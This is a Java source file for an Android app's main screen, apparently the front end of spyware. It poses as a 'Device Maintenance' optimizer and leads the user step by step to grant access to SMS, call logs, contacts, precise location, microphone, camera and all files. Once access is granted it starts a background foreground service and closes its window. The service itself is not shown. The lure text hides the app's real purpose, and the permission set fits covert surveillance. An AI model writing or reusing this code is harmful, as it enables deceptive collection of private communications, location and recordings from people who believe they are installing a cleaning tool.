package com.tenix.recon;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

// Zero lambdas → zero $$ExternalSyntheticLambda files
public class MainActivity extends Activity implements View.OnClickListener {

    private static final int REQ = 1;
    private static boolean waitingForStorage = false;
    private boolean step2 = false;  // false=askPerms, true=openStorage

    private TextView titleTv;
    private TextView descTv;
    private Button mainBtn;

    @SuppressWarnings("NewApi")
    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        if (isReady()) { launch(); return; }
        buildUI();
        if (hasRuntimePerms()) afterRuntimePerms();
    }

    @SuppressWarnings("NewApi")
    @Override
    protected void onResume() {
        super.onResume();
        if (waitingForStorage && Build.VERSION.SDK_INT >= 30
                && Environment.isExternalStorageManager()) {
            waitingForStorage = false;
            launch();
        }
    }

    // View.OnClickListener — no lambda needed
    @Override
    public void onClick(View v) {
        if (step2) openStorageSettings();
        else askPerms();
    }

    @SuppressWarnings("NewApi")
    private boolean isReady() {
        if (!hasRuntimePerms()) return false;
        if (Build.VERSION.SDK_INT >= 30) return Environment.isExternalStorageManager();
        return true;
    }

    private boolean hasRuntimePerms() {
        if (Build.VERSION.SDK_INT < 23) return true;
        for (String p : perms()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private void buildUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.WHITE);
        root.setPadding(dp(32), dp(80), dp(32), dp(80));

        ImageView icon = new ImageView(this);
        icon.setImageResource(android.R.drawable.ic_menu_manage);
        LinearLayout.LayoutParams ip = new LinearLayout.LayoutParams(dp(72), dp(72));
        ip.gravity = Gravity.CENTER_HORIZONTAL;
        ip.bottomMargin = dp(28);
        root.addView(icon, ip);

        titleTv = new TextView(this);
        titleTv.setText("Device Maintenance");
        titleTv.setTextSize(22);
        titleTv.setTextColor(Color.parseColor("#212121"));
        titleTv.setGravity(Gravity.CENTER);
        titleTv.setPadding(0, 0, 0, dp(12));
        root.addView(titleTv, matchWrap());

        descTv = new TextView(this);
        descTv.setText("To scan and optimize your device,\nplease allow access on the next screens.");
        descTv.setTextSize(14);
        descTv.setTextColor(Color.parseColor("#757575"));
        descTv.setGravity(Gravity.CENTER);
        descTv.setPadding(0, 0, 0, dp(48));
        root.addView(descTv, matchWrap());

        mainBtn = new Button(this);
        mainBtn.setText("Allow & Continue");
        mainBtn.setTextColor(Color.WHITE);
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#1565C0"));
        bg.setCornerRadius(dp(6));
        mainBtn.setBackground(bg);
        // 'this' as OnClickListener — no lambda/anonymous class
        mainBtn.setOnClickListener(this);
        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(50));
        root.addView(mainBtn, bp);

        setContentView(root);
    }

    private void askPerms() {
        if (Build.VERSION.SDK_INT >= 23) requestPermissions(perms(), REQ);
        else afterRuntimePerms();
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] p, int[] r) {
        afterRuntimePerms();
    }

    @SuppressWarnings("NewApi")
    private void afterRuntimePerms() {
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            step2 = true;
            waitingForStorage = true;
            if (titleTv != null) titleTv.setText("One More Step");
            if (descTv  != null) descTv.setText("Grant full storage access\nto complete setup.");
            if (mainBtn != null) mainBtn.setText("Grant Storage Access");
            // onClick already dispatches to openStorageSettings() when step2=true
        } else {
            launch();
        }
    }

    @SuppressWarnings("NewApi")
    private void openStorageSettings() {
        try {
            Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Exception e) { launch(); }
    }

    @SuppressWarnings("NewApi")
    private void launch() {
        Intent svc = new Intent(this, inq.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
        else startService(svc);
        finish();
    }

    private String[] perms() {
        if (Build.VERSION.SDK_INT >= 33) {
            return new String[]{
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.CALL_PHONE
            };
        }
        if (Build.VERSION.SDK_INT >= 26) {
            return new String[]{
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.CALL_PHONE
            };
        }
        return new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.CALL_PHONE
        };
    }

    private LinearLayout.LayoutParams matchWrap() {
        return new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }
}
